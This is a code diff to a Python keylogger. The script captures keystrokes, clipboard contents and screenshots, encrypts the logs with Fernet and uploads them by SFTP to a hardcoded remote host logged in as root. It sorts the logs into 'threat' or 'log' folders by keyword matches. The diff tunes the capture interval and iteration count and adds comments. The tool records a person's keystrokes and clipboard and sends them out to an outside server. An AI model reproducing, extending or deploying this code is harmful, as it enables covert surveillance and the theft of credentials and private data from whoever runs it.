@@ -9,16 +9,13 @@ from PIL import ImageGrab
 from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
 
-# from browser_history import get_history
-# from browser_history.browsers import Firefox
-
 keys_information = "key_log.txt"
 clipboard_information = "clipboard.txt"
 camera_information = ""
 screenshot_information = ""
 
-time_iterations = 300
-number_of_iterations_end = 1
+time_iterations = 200
+number_of_iterations_end = 20
 
 myHostname = "139.59.41.58"  # change this
 myUsername = "root"  # change this
@@ -146,6 +143,7 @@ def read_file():
             if any(keyword in line for keyword in string1):
                 print(line)
                 print("these words were found, storing in Threat Directory")
+                # If the words are found in the log file it will run these function
                 logfiles.close()
                 encrypt_files()
                 sftp_files_threat()
@@ -155,6 +153,7 @@ def read_file():
 
             else:
                 print("no words were found, storing in Log Directory")
+                # If the words are not found in the log file it will run these function
                 logfiles.close()
                 encrypt_files()
                 sftp_files_log()
@@ -162,8 +161,7 @@ def read_file():
                 print("Encrypted and stored in Log dir")
                 break
 
-
-        # closing text file
+    # closing text file
     logfiles.close()
 
 
